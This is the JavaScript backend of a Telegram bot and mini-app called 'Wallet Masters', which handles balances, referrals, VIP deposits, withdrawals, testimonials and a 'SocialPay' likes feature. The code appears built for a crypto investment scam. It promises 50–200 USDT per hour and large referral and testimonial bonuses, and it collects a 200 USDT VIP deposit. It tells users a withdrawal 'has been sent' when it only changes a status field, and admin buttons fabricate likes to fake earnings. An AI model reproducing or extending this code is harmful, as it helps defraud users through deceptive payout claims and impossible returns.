/**
 * Wallet Masters — Backend Bot + API  v5
 * Fixes: withdrawal status sync, testimonial duplicate route, fee calc,
 *        auth headers, timestamp precision, countdown double-start
 * New:   Poems/Inspiration, SocialPay with profiles/posts/likes/verification
 */
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express     = require('express');
const cors        = require('cors');
const path        = require('path');
const crypto      = require('crypto');

const {
  db, SHARED_TRC20_ADDRESS, MIN_WITHDRAWAL, MAX_WITHDRAWAL, GATEWAY_FEE_RATE, nowSec,
  getOrCreateUser, getUserByTelegramId, getUserById, updateUserBalance, upgradeToVIP,
  updateUserName, getAllUsers,
  claimHourlyEarning, getHourlyStatus,
  getEarningApps, getEarningAppByToken, getEarningAppById, addEarningApp, removeEarningApp,
  connectUID, getConnectedUID, getUserConnections, findUserByExternalUID,
  createTransaction, getUserTransactions, calculateFees,
  createWithdrawalRequest, getPendingWithdrawals, getWithdrawalById, updateWithdrawal, getUserWithdrawals,
  createSupportMessage, getSupportMessages, getAllSupportThreads, markSupportRead,
  createTestimonial, getTestimonialById, getPendingTestimonials, getApprovedTestimonials, updateTestimonial,
  createPoem, getPoemById, getPendingPoems, getApprovedPoems, updatePoem,
  getSocialProfile, updateSocialProfile, getAllSocialProfiles,
  createSocialPost, getSocialPostById, getPendingSocialPosts, getApprovedSocialPosts, getSocialPostsByUser, updateSocialPost, sendLikesToPost,
  likePost, hasLiked,
  createVerificationRequest, getVerificationById, getPendingVerifications, updateVerification,
  createBroadcast, getStats
} = require('./database');

const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '5995434559';
const BOT_USERNAME  = process.env.BOT_USERNAME  || 'walletmastersbot';
const FEE_ADDRESS   = process.env.FEE_ADDRESS   || 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const PORT          = parseInt(process.env.PORT) || 3000;

if (!BOT_TOKEN) { console.error('BOT_TOKEN missing'); process.exit(1); }

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, '.')));

let MINI_APP_URL = process.env.MINI_APP_URL || 'https://web-production-a3b658.up.railway.app';

app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '5.0' }));

app.listen(PORT, '0.0.0.0', () => {
  const host = process.env.RENDER_EXTERNAL_URL || process.env.RAILWAY_STATIC_URL || '';
  if (host) MINI_APP_URL = host.startsWith('http') ? host : `https://${host}`;
  console.log(`Wallet Masters v5.0 on port ${PORT} | URL: ${MINI_APP_URL}`);
});

// ─── Bot Init ─────────────────────────────────────────────────────────────────
let bot;
try { bot = new TelegramBot(BOT_TOKEN, { polling: true }); console.log('Bot started'); }
catch (err) { console.error('Bot failed:', err.message); }

// ─── Startup ─────────────────────────────────────────────────────────────────
setTimeout(async () => {
  if (!bot) return;
  try { await bot.setMyCommands([]); } catch(e) {}
  setMenuButton(ADMIN_CHAT_ID).catch(() => {});
  setTimeout(async () => {
    const users = getAllUsers(); let ok = 0;
    for (const u of users) {
      try { await setMenuButton(u.telegram_id); ok++; await new Promise(r => setTimeout(r, 200)); } catch(e) {}
    }
    console.log(`Menu button synced for ${ok} users`);
  }, 5000);
}, 3000);

// ─── Helpers ─────────────────────────────────────────────────────────────────
const ADMIN_KEYBOARD = {
  inline_keyboard: [
    [{ text: '📋 Withdrawals',  callback_data: 'admin_withdrawals'  }, { text: '🎬 Testimonials', callback_data: 'admin_testimonials' }],
    [{ text: '➕ Add App',      callback_data: 'admin_add_app'      }, { text: '🗑 Remove App',   callback_data: 'admin_remove_app'   }],
    [{ text: '📢 Broadcast',    callback_data: 'admin_broadcast'    }, { text: '📊 Stats',        callback_data: 'admin_stats'        }],
    [{ text: '👥 All Users',    callback_data: 'admin_all_users'    }, { text: '💬 Support',      callback_data: 'admin_support'      }],
    [{ text: '📝 Poems',        callback_data: 'admin_poems'        }, { text: '🌟 SocialPay',    callback_data: 'admin_socialpay'    }],
    [{ text: '✅ Verifications', callback_data: 'admin_verifications'}]
  ]
};

function openWalletBtn() {
  return { reply_markup: { inline_keyboard: [[{ text: '💎 Open Wallet Masters', web_app: { url: MINI_APP_URL } }]] } };
}
async function setMenuButton(chatId) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setChatMenuButton`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, menu_button: { type: 'web_app', text: 'Wallet Masters', web_app: { url: MINI_APP_URL } } })
    });
    const json = await res.json();
    if (!json.ok) console.log(`setMenuButton(${chatId}) failed:`, json.description);
  } catch(e) { console.log(`setMenuButton error:`, e.message); }
}
async function broadcastToAll(text) {
  const users = getAllUsers(); let sent = 0, failed = 0;
  for (const u of users) {
    if (!u.telegram_id) continue;
    try { await bot.sendMessage(u.telegram_id, text, { parse_mode: 'HTML', ...openWalletBtn() }); sent++; await new Promise(r => setTimeout(r, 60)); }
    catch(e) { failed++; }
  }
  return { sent, failed };
}

// ─── /setmenu ────────────────────────────────────────────────────────────────
if (bot) bot.onText(/\/setmenu/, async (msg) => {
  const adminId = String(msg.from?.id);
  if (adminId !== String(ADMIN_CHAT_ID)) return;
  const users  = getAllUsers();
  const allIds = [...users.map(u => String(u.telegram_id)), String(ADMIN_CHAT_ID)].filter(Boolean);
  bot.sendMessage(adminId, `⏳ Setting Wallet Masters button for ${allIds.length} users...`);
  let ok = 0, fail = 0;
  for (const tid of allIds) {
    try { await setMenuButton(tid); ok++; await new Promise(r => setTimeout(r, 100)); } catch(e) { fail++; }
  }
  bot.sendMessage(adminId, `✅ Done! Set: ${ok} | Failed: ${fail}\n\nClose and reopen bot chat to see the button.`);
});

// ─── /start ──────────────────────────────────────────────────────────────────
if (bot) bot.onText(/\/start(.*)/, async (msg, match) => {
  const { id, username, first_name, last_name } = msg.from;
  const fullName = [first_name, last_name].filter(Boolean).join(' ');
  const param    = (match[1] || '').trim();
  const refCode  = param.startsWith('ref_') ? param.replace('ref_', '') : null;
  const isAdmin  = String(id) === String(ADMIN_CHAT_ID);
  const user     = getOrCreateUser(id, username, fullName, refCode);
  const isNew    = user._isNew || false;

  await setMenuButton(id);

  if (isAdmin) {
    await bot.sendMessage(id,
      '⚙️ <b>Admin Panel ready.</b>\n\nYour <b>Wallet Masters</b> button is set. Use the panel below:',
      { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }

  if (user._referrer) {
    try {
      await bot.sendMessage(user._referrer.telegram_id,
        `🎉 <b>Referral Reward!</b>\n\n✅ Someone joined using your link!\n💰 <b>+200 USDT</b> added to your balance!\n💼 New balance: <b>${user._referrer.newBal.toFixed(2)} USDT</b>\n\nKeep sharing! 🚀`,
        { parse_mode: 'HTML', ...openWalletBtn() });
    } catch(e) {}
  }

  await bot.sendMessage(id, '💎 Wallet Masters', { reply_markup: { remove_keyboard: true } });

  if (isNew) {
    return bot.sendMessage(id,
      `🎉 <b>Welcome to Wallet Masters!</b>\n\nYou're now part of the family! 🚀\n\n1️⃣ Open the app below\n2️⃣ Accept Terms & Conditions\n3️⃣ Claim <b>50 USDT every hour</b>!\n4️⃣ Upgrade to VIP → earn 200 USDT/hr\n5️⃣ Refer friends → earn 200 USDT each\n\n💎 VIP: 200 USDT deposit · 200 USDT/hr · Global bank withdrawal`,
      { parse_mode: 'HTML', ...openWalletBtn() });
  } else {
    return bot.sendMessage(id,
      `👋 Welcome back, <b>${fullName || 'User'}</b>!\n\n🆔 UID: <code>${user.uid}</code>\n💰 Balance: <b>${(user.usdt_balance||0).toFixed(2)} USDT</b>${user.is_vip ? '\n👑 Status: VIP Member' : ''}\n\nTap below to open your wallet 👇`,
      { parse_mode: 'HTML', ...openWalletBtn() });
  }
});

// ─── callback_query ───────────────────────────────────────────────────────────
if (bot) bot.on('callback_query', async (cq) => {
  const data    = cq.data || '';
  const chatId  = cq.message?.chat?.id;
  const msgId   = cq.message?.message_id;
  const isAdmin = String(chatId) === String(ADMIN_CHAT_ID);

  // ── Withdrawal approve/reject ─────────────────────────────────────────────
  if (data.startsWith('wd_approve_') || data.startsWith('wd_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts  = data.split('_');
    const action = parts[1];
    const wdId   = parseInt(parts[2]);
    const wd     = getWithdrawalById(wdId);
    if (!wd) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });

    if (action === 'approve') {
      // FIX: update status to 'approved' so frontend poll picks it up
      updateWithdrawal(wdId, { status: 'approved' });
      bot.sendMessage(wd.telegram_id,
        `✅ <b>Withdrawal Approved!</b>\n\n💰 ${wd.amount} USDT has been sent to your account.\n\nThank you for using Wallet Masters! 💎`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ Approved!' });
    } else {
      updateWithdrawal(wdId, { status: 'rejected' });
      updateUserBalance(wd.telegram_id, wd.amount);
      bot.sendMessage(wd.telegram_id,
        `❌ <b>Withdrawal Rejected</b>\n\n💰 ${wd.amount} USDT has been refunded to your balance.\n\nContact support if you have questions.`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected & refunded' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── VIP approve/reject ────────────────────────────────────────────────────
  if (data.startsWith('vip_approve_') || data.startsWith('vip_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts  = data.split('_');
    const action = parts[1];
    const tid    = parts.slice(2).join('_');
    if (action === 'approve') {
      upgradeToVIP(tid);
      bot.sendMessage(tid,
        `👑 <b>Congratulations! You're now VIP!</b>\n\n✅ Deposit verified.\n💎 Now earning <b>200 USDT/hour</b>\n🏦 Bank withdrawals unlocked!\n\nTap below to start earning 🚀`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '👑 VIP Activated!' });
    } else {
      bot.sendMessage(tid,
        `❌ <b>VIP Upgrade Rejected</b>\n\nYour deposit could not be verified. Please try again or contact support.`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── Testimonial approve/reject ────────────────────────────────────────────
  if (data.startsWith('test_approve_') || data.startsWith('test_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts  = data.split('_');
    const action = parts[1];
    const tId    = parseInt(parts[2]);
    const tes    = getTestimonialById(tId);
    if (!tes) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      const reward = tes.type === 'youtube' ? 2000 : 1000;
      updateTestimonial(tId, { status: 'approved' });
      updateUserBalance(tes.telegram_id, reward);
      createTransaction(tes.telegram_id, 'testimonial_reward', reward, `Testimonial reward (${tes.type})`);
      bot.sendMessage(tes.telegram_id,
        `🎉 <b>Testimonial Approved!</b>\n\n✅ Your testimonial was approved!\n💰 <b>+${reward.toLocaleString()} USDT</b> added to your balance!\n\nThank you! 🙏`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: `✅ Approved! +${reward} USDT` });
    } else {
      updateTestimonial(tId, { status: 'rejected' });
      bot.sendMessage(tes.telegram_id,
        `❌ <b>Testimonial Rejected</b>\n\nYour testimonial did not meet our guidelines. Please try again.`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── Poem approve/reject ───────────────────────────────────────────────────
  if (data.startsWith('poem_approve_') || data.startsWith('poem_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts  = data.split('_');
    const action = parts[1];
    const pId    = parseInt(parts[2]);
    const poem   = getPoemById(pId);
    if (!poem) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      updatePoem(pId, { status: 'approved' });
      updateUserBalance(poem.telegram_id, 1000);
      createTransaction(poem.telegram_id, 'poem_reward', 1000, 'Poem/Inspiration reward');
      bot.sendMessage(poem.telegram_id,
        `🎉 <b>Your Post was Approved!</b>\n\n✅ Your poem/inspiration has been approved!\n💰 <b>+1,000 USDT</b> added to your balance!\n\nKeep inspiring the community! ✨`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ Approved! +1,000 USDT' });
    } else {
      updatePoem(pId, { status: 'rejected' });
      bot.sendMessage(poem.telegram_id,
        `❌ <b>Post Rejected</b>\n\nYour poem/inspiration was not approved. Please review our content guidelines and try again.`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── SocialPay post approve/reject ─────────────────────────────────────────
  if (data.startsWith('sp_approve_') || data.startsWith('sp_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts  = data.split('_');
    const action = parts[1];
    const spId   = parseInt(parts[2]);
    const post   = getSocialPostById(spId);
    if (!post) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      updateSocialPost(spId, { status: 'approved' });
      bot.sendMessage(post.telegram_id,
        `🌟 <b>SocialPay Post Approved!</b>\n\n✅ Your post is now live on SocialPay!\n\nEarn USDT as you get likes:\n❤️ 1K likes → 100 USDT\n❤️ 10K likes → 1,000 USDT\n❤️ 100K likes → 10,000 USDT\n❤️ 1M likes → 100,000 USDT\n\nShare your post to get more likes! 🚀`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ SocialPay post approved!' });
    } else {
      updateSocialPost(spId, { status: 'rejected' });
      bot.sendMessage(post.telegram_id,
        `❌ <b>SocialPay Post Rejected</b>\n\nYour post did not meet our guidelines. Please review and try again.`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── Send likes to SocialPay post ──────────────────────────────────────────
  if (data.startsWith('sp_likes_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    // format: sp_likes_<postId>_<amount>
    const parts   = data.split('_');
    const spId    = parseInt(parts[2]);
    const amount  = parseInt(parts[3]);
    const result  = sendLikesToPost(spId, amount, bot, ADMIN_CHAT_ID, openWalletBtn);
    if (result.success) {
      const post = getSocialPostById(spId);
      const user = getUserByTelegramId(post?.telegram_id);
      bot.answerCallbackQuery(cq.id, { text: `✅ ${amount.toLocaleString()} likes sent! ${result.earned > 0 ? '+' + result.earned.toLocaleString() + ' USDT paid' : ''}` });
      bot.editMessageText(
        `${cq.message.text}\n\n✅ <b>${amount.toLocaleString()} likes sent!</b>\nTotal likes: ${result.newLikes.toLocaleString()}\n${result.earned > 0 ? `💰 Paid: +${result.earned.toLocaleString()} USDT to ${user?.full_name || 'user'}` : ''}`,
        { chat_id: chatId, message_id: msgId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [] } }
      ).catch(() => {});
    } else {
      bot.answerCallbackQuery(cq.id, { text: '❌ ' + (result.error || 'Failed') });
    }
    return;
  }

  // ── Verification approve/reject ───────────────────────────────────────────
  if (data.startsWith('ver_approve_') || data.startsWith('ver_reject_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const parts  = data.split('_');
    const action = parts[1];
    const vId    = parseInt(parts[2]);
    const ver    = getVerificationById(vId);
    if (!ver) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
    if (action === 'approve') {
      updateVerification(vId, { status: 'approved' });
      updateSocialProfile(ver.telegram_id, { is_verified: true, verification_status: 'approved' });
      bot.sendMessage(ver.telegram_id,
        `🟠 <b>Verified Badge Granted!</b>\n\n✅ Congratulations! You are now a Verified Creator on SocialPay!\n\nYour orange ✅ verified badge is now visible on your profile. Keep creating amazing content! 🌟`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '✅ Verified badge granted!' });
    } else {
      updateVerification(vId, { status: 'rejected' });
      updateSocialProfile(ver.telegram_id, { verification_status: 'rejected' });
      bot.sendMessage(ver.telegram_id,
        `❌ <b>Verification Rejected</b>\n\nYour verification request was not approved at this time. You need at least 1,000 likes on a post to qualify. Keep earning likes and try again!`,
        { parse_mode: 'HTML', ...openWalletBtn() });
      bot.answerCallbackQuery(cq.id, { text: '❌ Rejected' });
    }
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── Remove app ────────────────────────────────────────────────────────────
  if (data.startsWith('remove_app_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    removeEarningApp(parseInt(data.replace('remove_app_', '')));
    bot.answerCallbackQuery(cq.id, { text: '✅ App removed' });
    bot.editMessageText('✅ Earning App removed.', { chat_id: chatId, message_id: msgId }).catch(() => {});
    return;
  }

  // ── Support reply button ──────────────────────────────────────────────────
  if (data.startsWith('reply_user_')) {
    if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
    const tid = data.replace('reply_user_', '');
    const u   = getUserByTelegramId(tid);
    bot.answerCallbackQuery(cq.id, { text: 'Reply mode active' });
    bot.sendMessage(chatId,
      `💬 <b>Reply to ${u?.full_name || 'User'} (${u?.uid || tid})</b>\n\nJust type your reply message. Start with the UID to target:\n<code>UID:${u?.uid || tid} Your message here</code>`,
      { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }

  // ── Admin panel buttons ───────────────────────────────────────────────────
  if (!isAdmin) return bot.answerCallbackQuery(cq.id, { text: '❌ Not authorized' });
  bot.answerCallbackQuery(cq.id);

  if (data === 'admin_stats') {
    const s = getStats();
    bot.sendMessage(chatId,
      `📊 <b>Wallet Masters Stats</b>\n\n👥 Users: ${s.users}\n👑 VIP: ${s.vip}\n💸 Pending Withdrawals: ${s.pending_withdrawals}\n📱 Earning Apps: ${s.earning_apps}\n🎬 Pending Testimonials: ${s.pending_testimonials}\n📝 Pending Poems: ${s.pending_poems}\n🌟 Pending SocialPay: ${s.pending_socialpay}\n✅ Pending Verifications: ${s.pending_verifications}`,
      { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }

  if (data === 'admin_withdrawals') {
    const wds = getPendingWithdrawals();
    if (!wds.length) { bot.sendMessage(chatId, '✅ No pending withdrawals.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const wd of wds.slice(0, 5)) {
      const u = getUserByTelegramId(wd.telegram_id);
      bot.sendMessage(chatId,
        `💸 <b>Withdrawal #${wd.id}</b>\n\n👤 ${u?.full_name || 'User'} (${u?.uid || wd.telegram_id})\n💰 ${wd.amount} USDT\n🏦 ${wd.bank_name || wd.method || 'Crypto'} — ${wd.account_number || ''}\n🌍 ${wd.country || ''} ${wd.currency || ''}`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
          { text: '✅ Approve', callback_data: `wd_approve_${wd.id}` },
          { text: '❌ Reject',  callback_data: `wd_reject_${wd.id}`  }
        ]]}});
    }
    return;
  }

  if (data === 'admin_testimonials') {
    const tests = getPendingTestimonials();
    if (!tests.length) { bot.sendMessage(chatId, '✅ No pending testimonials.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const t of tests.slice(0, 5)) {
      const reward = t.type === 'youtube' ? 2000 : 1000;
      bot.sendMessage(chatId,
        `🎬 <b>Testimonial #${t.id}</b>\n\n👤 ${t.user_name || 'User'}\n📎 ${t.type === 'youtube' ? '📺 YouTube' : '🎥 Video'}\n${t.youtube_url ? '🔗 ' + t.youtube_url + '\n' : ''}💬 ${t.caption || 'none'}\n💰 Reward: ${reward} USDT`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
          { text: `✅ Approve (+${reward} USDT)`, callback_data: `test_approve_${t.id}` },
          { text: '❌ Reject', callback_data: `test_reject_${t.id}` }
        ]]}});
    }
    return;
  }

  if (data === 'admin_poems') {
    const poems = getPendingPoems();
    if (!poems.length) { bot.sendMessage(chatId, '✅ No pending poems/inspirations.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const p of poems.slice(0, 5)) {
      const u = getUserByTelegramId(p.telegram_id);
      bot.sendMessage(chatId,
        `📝 <b>Poem/Inspiration #${p.id}</b>\n\n👤 ${u?.full_name || 'User'}\n📂 Category: ${p.category || 'General'}\n\n"${(p.content || '').substring(0, 300)}${p.content?.length > 300 ? '...' : ''}"\n\n💰 Reward: 1,000 USDT`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
          { text: '✅ Approve (+1,000 USDT)', callback_data: `poem_approve_${p.id}` },
          { text: '❌ Reject', callback_data: `poem_reject_${p.id}` }
        ]]}});
    }
    return;
  }

  if (data === 'admin_socialpay') {
    const posts = getPendingSocialPosts();
    if (!posts.length) { bot.sendMessage(chatId, '✅ No pending SocialPay posts.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const p of posts.slice(0, 5)) {
      const u = getUserByTelegramId(p.telegram_id);
      bot.sendMessage(chatId,
        `🌟 <b>SocialPay Post #${p.id}</b>\n\n👤 ${u?.full_name || 'User'}\n📎 Type: ${p.post_type || 'post'}\n💬 "${(p.caption || '').substring(0, 200)}"\n\nApprove to make it live. Then send likes to reward user.`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
          [{ text: '✅ Approve Post', callback_data: `sp_approve_${p.id}` }, { text: '❌ Reject', callback_data: `sp_reject_${p.id}` }],
          [{ text: '❤️ Send 1K likes',  callback_data: `sp_likes_${p.id}_1000`    }, { text: '❤️ Send 10K likes', callback_data: `sp_likes_${p.id}_10000`  }],
          [{ text: '❤️ Send 100K likes',callback_data: `sp_likes_${p.id}_100000`  }, { text: '❤️ Send 1M likes', callback_data: `sp_likes_${p.id}_1000000` }]
        ]}});
    }
    return;
  }

  if (data === 'admin_verifications') {
    const vers = getPendingVerifications();
    if (!vers.length) { bot.sendMessage(chatId, '✅ No pending verification requests.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const v of vers.slice(0, 5)) {
      const u    = getUserByTelegramId(v.telegram_id);
      const prof = getSocialProfile(v.telegram_id);
      bot.sendMessage(chatId,
        `✅ <b>Verification Request #${v.id}</b>\n\n👤 ${u?.full_name || 'User'}\n❤️ Total likes: ${prof?.total_likes?.toLocaleString() || 0}\n📝 Posts: ${getSocialPostsByUser(v.telegram_id).filter(p=>p.status==='approved').length}`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[
          { text: '🟠 Grant Verified Badge', callback_data: `ver_approve_${v.id}` },
          { text: '❌ Reject', callback_data: `ver_reject_${v.id}` }
        ]]}});
    }
    return;
  }

  if (data === 'admin_all_users') {
    const users = getAllUsers().slice(-10).reverse();
    const lines = users.map(u => `• ${u.full_name||'?'} | ${u.uid} | ${u.usdt_balance?.toFixed(2)||0} USDT${u.is_vip?' 👑':''}`).join('\n');
    bot.sendMessage(chatId, `👥 <b>Recent Users (last 10)</b>\n\n${lines}`, { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
    return;
  }

  if (data === 'admin_support') {
    const threads = getAllSupportThreads();
    const tids    = Object.keys(threads).filter(tid => {
      const msgs = threads[tid];
      return msgs.some(m => !m.from_admin && !m.read);
    });
    if (!tids.length) { bot.sendMessage(chatId, '✅ No unread support messages.', { reply_markup: ADMIN_KEYBOARD }); return; }
    for (const tid of tids.slice(0, 5)) {
      const u    = getUserByTelegramId(tid);
      const msgs = threads[tid].filter(m => !m.from_admin).slice(-3);
      const text = msgs.map(m => `"${m.message}"`).join('\n');
      bot.sendMessage(chatId,
        `💬 <b>Support from ${u?.full_name||'User'} (UID:${u?.uid||tid})</b>\n\n${text}`,
        { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Reply', callback_data: `reply_user_${tid}` }]] }});
    }
    return;
  }

  if (data === 'admin_broadcast') {
    bot.sendMessage(chatId,
      '📢 <b>Broadcast</b>\n\nSend a message starting with <code>BROADCAST:</code> followed by your text.\n\nOr send a photo/video with caption to broadcast media.',
      { parse_mode: 'HTML' });
    return;
  }

  if (data === 'admin_add_app') {
    bot.sendMessage(chatId,
      '➕ <b>Add Earning App</b>\n\nSend in this format:\n<code>ADD_APP\nName: App Name\nToken: bot_token_here</code>',
      { parse_mode: 'HTML' });
    return;
  }

  if (data === 'admin_remove_app') {
    const apps = getEarningApps();
    if (!apps.length) { bot.sendMessage(chatId, '✅ No apps to remove.', { reply_markup: ADMIN_KEYBOARD }); return; }
    bot.sendMessage(chatId, '🗑 <b>Select app to remove:</b>', {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: apps.map(a => [{ text: `🗑 ${a.name}`, callback_data: `remove_app_${a.id}` }]) }
    });
    return;
  }
});

// ─── Admin text messages ──────────────────────────────────────────────────────
if (bot) bot.on('message', async (msg) => {
  const id      = String(msg.from?.id);
  const isAdmin = id === String(ADMIN_CHAT_ID);
  if (!isAdmin) return;
  if (msg.web_app_data) return;

  const text  = msg.text;
  const photo = msg.photo;
  const video = msg.video;
  const voice = msg.voice;

  // Reply to user support (UID:xxxx message)
  const uidMatch = text?.match(/^UID:(\S+)\s+([\s\S]+)/);
  if (uidMatch) {
    const users   = getAllUsers();
    const found   = users.find(u => u.uid === uidMatch[1] || u.telegram_id === uidMatch[1]);
    const replyTo = found ? String(found.telegram_id) : null;
    if (replyTo && uidMatch[2]) {
      createSupportMessage(replyTo, uidMatch[2], true);
      try {
        await bot.sendMessage(replyTo, `💬 <b>Support Team</b>\n\n${uidMatch[2]}`, { parse_mode: 'HTML', ...openWalletBtn() });
        return bot.sendMessage(id, `✅ Reply sent.`);
      } catch(e) { return bot.sendMessage(id, `❌ Failed: ${e.message}`); }
    }
  }

  // Media broadcast
  if (!text && (photo || video || voice)) {
    const caption = msg.caption || '';
    bot.sendMessage(id, '📤 Broadcasting media...');
    const allUsers = getAllUsers(); let sent = 0, failed = 0;
    for (const u of allUsers) {
      if (!u.telegram_id) continue;
      try {
        if (photo) await bot.sendPhoto(u.telegram_id, photo[photo.length-1].file_id, { caption, parse_mode: 'HTML' });
        if (video) await bot.sendVideo(u.telegram_id, video.file_id, { caption, parse_mode: 'HTML' });
        if (voice) await bot.sendVoice(u.telegram_id, voice.file_id);
        sent++; await new Promise(r => setTimeout(r, 60));
      } catch(e) { failed++; }
    }
    return bot.sendMessage(id, `✅ Broadcast complete!\n📤 Sent: ${sent} | ❌ Failed: ${failed}`, { reply_markup: ADMIN_KEYBOARD });
  }

  if (!text) return;
  const t = text.trim();

  if (t.startsWith('BROADCAST:')) {
    const message = t.replace('BROADCAST:', '').trim();
    if (!message) return bot.sendMessage(id, '❌ Empty message');
    bot.sendMessage(id, '📤 Broadcasting...');
    const result = await broadcastToAll(`📢 <b>Wallet Masters Update</b>\n\n${message}`);
    return bot.sendMessage(id, `✅ Broadcast complete!\n📤 Sent: ${result.sent} | ❌ Failed: ${result.failed}`, { reply_markup: ADMIN_KEYBOARD });
  }

  if (t.startsWith('ADD_APP')) {
    const lines2 = t.split('\n');
    const name   = (lines2.find(l => l.startsWith('Name:'))  || '').replace('Name:',  '').trim();
    const token  = (lines2.find(l => l.startsWith('Token:')) || '').replace('Token:', '').trim();
    if (!name || !token) return bot.sendMessage(id, '❌ Format:\nADD_APP\nName: ...\nToken: ...');
    const app2 = addEarningApp({ name, bot_token: token });
    return bot.sendMessage(id, `✅ Earning App added!\n🆔 ID: ${app2.id}\n📱 Name: ${app2.name}`, { reply_markup: ADMIN_KEYBOARD });
  }
});

// ─── Auth helpers ─────────────────────────────────────────────────────────────
function validateTelegramData(initData) {
  if (!initData) return null;
  try {
    const params  = new URLSearchParams(initData);
    const hash    = params.get('hash');
    params.delete('hash');
    const sorted  = [...params.entries()].sort(([a],[b]) => a.localeCompare(b));
    const dataStr = sorted.map(([k,v]) => `${k}=${v}`).join('\n');
    const secret  = crypto.createHmac('sha256', 'WebAppData').update(BOT_TOKEN).digest();
    const check   = crypto.createHmac('sha256', secret).update(dataStr).digest('hex');
    return check === hash ? Object.fromEntries(params) : null;
  } catch(e) { return null; }
}
function getTelegramUser(req) {
  const initData = req.headers['x-telegram-init-data'] || req.body?.initData || req.query?.initData;
  if (!initData) return null;
  const validated = validateTelegramData(initData);
  if (!validated) return null;
  try { return JSON.parse(validated.user); } catch(e) { return null; }
}
function authMiddleware(req, res, next) {
  const tgUser = getTelegramUser(req);
  if (!tgUser) return res.status(401).json({ error: 'Unauthorized' });
  req.tgUser = tgUser;
  next();
}

function enrichUser(user, tid) {
  if (!user) return null;
  const hourlyStatus = getHourlyStatus(tid || user.telegram_id);
  const earningRate  = user.is_vip ? 200 : 50;
  return {
    ...user,
    balance: user.usdt_balance || 0,
    trc20Address: user.trc20_address || SHARED_TRC20_ADDRESS,
    isVIP: user.is_vip === true,
    termsAccepted: user.terms_accepted === true,
